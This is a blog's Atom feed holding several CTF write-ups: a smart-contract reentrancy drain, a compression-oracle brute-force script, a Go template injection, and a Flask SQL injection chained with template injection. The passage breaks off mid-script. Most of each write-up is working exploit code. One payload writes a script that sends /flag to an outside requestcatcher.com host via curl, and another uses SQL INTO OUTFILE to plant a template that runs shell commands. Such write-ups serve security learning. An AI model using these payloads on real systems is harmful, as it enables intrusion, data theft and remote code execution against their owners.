<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://shafouz.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://shafouz.github.io/" rel="alternate" type="text/html" /><updated>2024-12-24T20:07:14+00:00</updated><id>https://shafouz.github.io/feed.xml</id><title type="html">shafouz blog</title><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><entry><title type="html">ArcticVault - GlacierCTF 2024</title><link href="https://shafouz.github.io/2024/11/24/ArcticVault.html" rel="alternate" type="text/html" title="ArcticVault - GlacierCTF 2024" /><published>2024-11-24T04:00:00+00:00</published><updated>2024-11-24T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/11/24/ArcticVault</id><content type="html" xml:base="https://shafouz.github.io/2024/11/24/ArcticVault.html"><![CDATA[<p>https://ctftime.org/event/2402</p>

<h1 id="arcticvault-blockchain">ArcticVault (blockchain)</h1>

<p>Reentrancy challenge</p>

<h2 id="solution">Solution</h2>

<p>The challenge is a simple vault contract. And you objective is drain it.
The contract has a reentrancy guard on most of the functions. Except <code class="language-plaintext highlighter-rouge">flashLoan</code>.
It also starts with <code class="language-plaintext highlighter-rouge">reentrancyGuard = false</code>.
The bug is that flashLoan accepts loans for zero. 
And that allows you to bypass the guard by just calling flashLoan(0).</p>

<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">contract</span> <span class="n">Setup</span> <span class="p">{</span>
    <span class="n">ArcticVault</span> <span class="k">public</span> <span class="kr">immutable</span> <span class="n">TARGET</span><span class="p">;</span> <span class="c1">// Contract the player will hack
</span>
    <span class="k">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">==</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>

        <span class="c1">// Deploy the victim contract
</span>        <span class="n">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArcticVault</span><span class="p">();</span>

        <span class="n">TARGET</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
    <span class="p">}</span>

    <span class="c1">// Our challenge in the CTF framework will call this function to
</span>    <span class="c1">// check whether the player has solved the challenge or not.
</span>    <span class="k">function</span> <span class="n">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// --------------- ArcticVault.sol ---------------
// The first artic vault, even safer than swiss banking ;)
// Deposit your funds, and the tax collector will never find them.
// We even offer the coldest flash loans in the world!
</span>
<span class="k">contract</span> <span class="n">ArcticVault</span>
<span class="p">{</span>
    <span class="kt">address</span> <span class="n">owner</span><span class="p">;</span>
    <span class="k">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="n">balances</span><span class="p">;</span>
    <span class="kt">bool</span> <span class="n">paused</span><span class="p">;</span>
    <span class="kt">bool</span> <span class="k">public</span> <span class="n">reentrancyGuard</span><span class="p">;</span>

    <span class="k">modifier</span> <span class="n">notPaused</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">paused</span><span class="p">,</span> <span class="s">"Contract is paused"</span><span class="p">);</span>
        <span class="n">_</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">event</span> <span class="n">Donation</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">from</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">);</span>

    <span class="k">event</span> <span class="n">MyEvent</span><span class="p">(</span><span class="kt">bytes</span> <span class="n">data</span><span class="p">);</span>

    <span class="k">constructor</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">//Users can deposit funds into the contract
</span>    <span class="k">function</span> <span class="n">deposit</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="n">notPaused</span>
    <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"Amount must be greater than 0"</span><span class="p">);</span>

        <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Donate to the glacier
</span>    <span class="k">function</span> <span class="n">donate</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="n">notPaused</span>
    <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"Amount must be greater than 0"</span><span class="p">);</span>

        <span class="n">owner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
        
        <span class="k">emit</span> <span class="n">Donation</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">//Users can withdraw funds from the vault
</span>    <span class="k">function</span> <span class="n">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="n">notPaused</span>
    <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"You have no funds to withdraw"</span><span class="p">);</span>

        <span class="kt">uint256</span> <span class="n">amount</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">];</span>
        <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="k">payable</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">//Pause contract (in case the glacier gets infiltrated)
</span>    <span class="k">function</span> <span class="n">pause</span><span class="p">()</span> <span class="k">public</span>
    <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">"You are not the owner of this contract"</span><span class="p">);</span>
        <span class="n">paused</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">//Unpause contract (in case the glacier gets cleared)
</span>    <span class="k">function</span> <span class="n">unpause</span><span class="p">()</span> <span class="k">public</span>
    <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">"You are not the owner of this contract"</span><span class="p">);</span>
        <span class="n">paused</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="n">flashLoan</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="n">notPaused</span>
    <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="n">amount</span><span class="p">,</span> <span class="s">"Owner has insufficient funds"</span><span class="p">);</span>

        <span class="kt">uint256</span> <span class="n">balanceBefore</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>

        <span class="c1">//Do the flash loan
</span>        <span class="n">reentrancyGuard</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
        <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">amount</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
        <span class="n">reentrancyGuard</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

        <span class="nb">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="n">balanceBefore</span><span class="p">,</span> <span class="s">"Flash loan failed"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// ------------------ Utils to make your life easier ------------------
</span>

    <span class="c1">//Multicall for other contracts (saves gas)
</span>    <span class="k">function</span> <span class="n">multicallOthers</span><span class="p">(</span><span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_targets</span><span class="p">,</span> <span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_data</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> 
    <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">_targets</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="n">_data</span><span class="p">.</span><span class="n">length</span><span class="p">,</span> <span class="s">"Arrays must be the same length"</span><span class="p">);</span>

        <span class="k">for</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">_targets</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">_targets</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nb">call</span><span class="p">(</span><span class="n">_data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"Transaction failed"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">//Multicall for this contract (saves gas)
</span>    <span class="k">function</span> <span class="n">multicallThis</span><span class="p">(</span><span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_data</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span>
    <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>

        <span class="k">for</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">_data</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">_data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"Transaction failed"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">//Carve your personalized event into the ice
</span>    <span class="k">function</span> <span class="n">emitEvent</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_data</span><span class="p">)</span> <span class="k">public</span>
    <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>

        <span class="k">emit</span> <span class="n">MyEvent</span><span class="p">(</span><span class="n">_data</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">import</span> <span class="s">"forge-std/Script.sol"</span><span class="p">;</span>
<span class="k">import</span> <span class="s">"forge-std/console.sol"</span><span class="p">;</span>

<span class="k">contract</span> <span class="n">Atk</span> <span class="p">{</span>
  <span class="n">ArcticVault</span> <span class="n">av</span><span class="p">;</span>
  <span class="kt">bool</span> <span class="n">toggle</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

  <span class="k">function</span> <span class="n">run</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
    <span class="n">av</span> <span class="o">=</span> <span class="n">ArcticVault</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
    <span class="n">av</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
    <span class="n">av</span><span class="p">.</span><span class="n">withdraw</span><span class="p">();</span>
  <span class="p">}</span>

  <span class="k">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">toggle</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
    <span class="n">toggle</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
    <span class="n">av</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="mi">0</span> <span class="kc">ether</span><span class="p">);</span>
    <span class="n">av</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="k">contract</span> <span class="n">Hax</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
  <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
    <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">"PRIVATE_KEY"</span><span class="p">));</span>
    <span class="n">Setup</span> <span class="n">setup</span> <span class="o">=</span> <span class="n">Setup</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xcC29E0ba11fA7fcBF65F58E7A59a46C1a3cBfEd3</span><span class="p">));</span>
    <span class="n">ArcticVault</span> <span class="n">chall</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">TARGET</span><span class="p">();</span>

    <span class="n">Atk</span> <span class="n">atk</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Atk</span><span class="p">();</span>
    <span class="n">atk</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">chall</span><span class="p">));</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="flag">Flag</h2>
<p><code class="language-plaintext highlighter-rouge">gctf{Me55age_d0t_wh4t?}</code></p>

<p>shafouz 2024/11/24</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2402]]></summary></entry><entry><title type="html">just a day at the breach - BlueHens 2024</title><link href="https://shafouz.github.io/2024/11/10/just-a-day-at-the-breach.html" rel="alternate" type="text/html" title="just a day at the breach - BlueHens 2024" /><published>2024-11-10T04:00:00+00:00</published><updated>2024-11-10T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/11/10/just-a-day-at-the-breach</id><content type="html" xml:base="https://shafouz.github.io/2024/11/10/just-a-day-at-the-breach.html"><![CDATA[<p>https://ctftime.org/event/2512</p>

<h1 id="just-a-day-at-the-breach-web">just a day at the breach (web)</h1>

<p>zlib compress challenge</p>

<h2 id="solution">Solution</h2>

<p>The challenge gives a oracle that shows the message length.
So we can guess every character and if the length changes thats the correct character.
Example:
<code class="language-plaintext highlighter-rouge">uu</code> -&gt; 67
<code class="language-plaintext highlighter-rouge">ub</code> -&gt; 68</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">string</span>

<span class="k">def</span> <span class="nf">guess_big</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
    <span class="n">REMOTE</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s">"https://55nlig2es7hyrhvzcxzboyp4xe0nzjrc.lambda-url.us-east-1.on.aws/?payload="</span>
        <span class="o">+</span> <span class="n">w</span>
    <span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">REMOTE</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">w</span><span class="p">),</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"---"</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"udctf{"</span>
<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">:</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">c</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="n">j</span> <span class="o">=</span> <span class="n">guess_big</span><span class="p">((</span><span class="n">flag</span> <span class="o">+</span> <span class="n">c</span><span class="p">).</span><span class="nb">hex</span><span class="p">())[</span><span class="s">"sniffed"</span><span class="p">]</span>

        <span class="k">if</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">68</span><span class="p">:</span>
            <span class="nb">max</span> <span class="o">=</span> <span class="n">j</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">c</span>
            <span class="k">break</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[12]: lab1.py:49: flag=</span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="flag">Flag</h2>
<p><code class="language-plaintext highlighter-rouge">udctf{huffm4n_br34ched_l3t5_go}</code></p>

<p>shafouz 2024/11/10</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2512]]></summary></entry><entry><title type="html">sandevistan - Blue Water CTF 2024</title><link href="https://shafouz.github.io/2024/10/13/sandevistan.html" rel="alternate" type="text/html" title="sandevistan - Blue Water CTF 2024" /><published>2024-10-13T04:00:00+00:00</published><updated>2024-10-13T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/10/13/sandevistan</id><content type="html" xml:base="https://shafouz.github.io/2024/10/13/sandevistan.html"><![CDATA[<p>https://ctftime.org/event/2479</p>

<h1 id="sandevistan-web">Sandevistan (Web)</h1>

<p>Go web chall</p>

<h2 id="solution">Solution</h2>

<p>You overwrite a template then you need to find some useful gadget on <code class="language-plaintext highlighter-rouge">user</code> or <code class="language-plaintext highlighter-rouge">cyberware</code> to get the flag.
There is a healthcheck function that calls <code class="language-plaintext highlighter-rouge">/bin/true</code>.
So the idea is to overwrite that with something.
But that doesn’t work because the file will start with <code class="language-plaintext highlighter-rouge">ERROR ...</code> and not run.
<code class="language-plaintext highlighter-rouge">NewError</code> plus <code class="language-plaintext highlighter-rouge">SerializeErrors</code> allows us to write to any offset in a file.
So we just do that.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">urllib</span>


<span class="n">REMOTE</span> <span class="o">=</span> <span class="s">"http://sandevistan.chal.perfect.blue:28418/"</span>

<span class="c1"># create user
</span><span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
    <span class="n">REMOTE</span> <span class="o">+</span> <span class="s">"user"</span><span class="p">,</span>
    <span class="n">data</span><span class="o">=</span><span class="s">"username=xad"</span><span class="p">,</span>
<span class="p">)</span>

<span class="nb">bin</span> <span class="o">=</span> <span class="p">(</span>
    <span class="s">"""{{ .NewError "asdsadasd" "/bin/true" }}
rs -&gt; {{ range $index, $value := .Errors }}{{ $index }} - {{ $value }}</span><span class="se">\n</span><span class="s">{{ end }}
alize -&gt; {{ .SerializeErrors "#!/bin/bash</span><span class="se">\\</span><span class="s">ncurl https://lalalalalallalala.requestcatcher.com/ -d @/flag</span><span class="se">\\</span><span class="s">n" 0 0 }}
thcheck -&gt;  {{ .UserHealthcheck }}"""</span>
    <span class="o">+</span> <span class="s">" "</span> <span class="o">*</span> <span class="mi">2000</span>
<span class="p">)</span>
<span class="nb">bin</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="nb">bin</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
    <span class="n">REMOTE</span> <span class="o">+</span> <span class="s">"cyberware"</span><span class="p">,</span>
    <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/x-www-form-urlencoded"</span><span class="p">},</span>
    <span class="n">data</span><span class="o">=</span><span class="sa">f</span><span class="s">"username=../tmpl/user.html&amp;name=</span><span class="si">{</span><span class="nb">bin</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
<span class="p">)</span>

<span class="c1"># get user, new template
</span><span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span>
    <span class="n">REMOTE</span> <span class="o">+</span> <span class="s">"user"</span><span class="p">,</span>
    <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/x-www-form-urlencoded"</span><span class="p">},</span>
    <span class="n">data</span><span class="o">=</span><span class="s">"username=xad"</span><span class="p">,</span>
<span class="p">)</span>
</code></pre></div></div>

<h2 id="flag">Flag</h2>
<p><code class="language-plaintext highlighter-rouge">bwctf{YoU_kNoW_yOu_d1dnt_l0s3_Ur_53Lf-coNtR0L._LEt'5_start_at_the_r4inB0w}</code></p>

<p>shafouz - 2024/10/13</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2479]]></summary></entry><entry><title type="html">flask destroyer - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/flask-destroyer.html" rel="alternate" type="text/html" title="flask destroyer - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/flask-destroyer</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/flask-destroyer.html"><![CDATA[<p>https://ctftime.org/event/2423</p>

<h1 id="flask-destroyer-web">flask-destroyer (web)</h1>

<p>flask sqli</p>

<h2 id="solution">Solution</h2>

<p>There is an sqli on login, and <code class="language-plaintext highlighter-rouge">secure_file_priv = ""</code>.
So we can upload any file we want.</p>

<p>There is just the problem that flask hotloading is off, so we cannot load new templates.</p>

<p>The solution is crashing the worker so when it restarts it loads the new templates in.
The intented way to crash the worker is abusing <code class="language-plaintext highlighter-rouge">strtok</code> from libc, <code class="language-plaintext highlighter-rouge">asdsad:asda:</code> segfaults it</p>

<p>The full exploit then:</p>
<ul>
  <li>upload template</li>
  <li>crash</li>
  <li>get new template</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote_plus</span>

<span class="c1"># REMOTE = "http://0.0.0.0:1337/"
</span><span class="n">REMOTE</span> <span class="o">=</span> <span class="s">"http://challs.tfcctf.com:32006/"</span>

<span class="k">def</span> <span class="nf">create_file</span><span class="p">():</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'''" UNION SELECT '{{ dict.__base__.__subclasses__()[379]("cat $(find /tmp -type f)",shell=True,stdout=-1).communicate()[0] }}', '', '' into outfile '/destroyer/app/templates/a.html'-- '''</span>
    <span class="n">login</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'username=1&amp;password=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">&amp;vibe=y'</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="s">'login'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span><span class="s">'application/x-www-form-urlencoded'</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">login</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
        <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
        <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
    <span class="p">})</span>


<span class="k">def</span> <span class="nf">crash</span><span class="p">():</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'''" UNION SELECT 'this works', 'sdsadasd', 'bla:'-- '''</span>
    <span class="n">login</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'username=1&amp;password=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">&amp;vibe=y'</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="s">'login'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span><span class="s">'application/x-www-form-urlencoded'</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">login</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
        <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
        <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
    <span class="p">})</span>

<span class="k">def</span> <span class="nf">get</span><span class="p">():</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'''" OR 1=1-- '''</span>
    <span class="n">login</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'username=1&amp;password=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">&amp;vibe=y'</span>
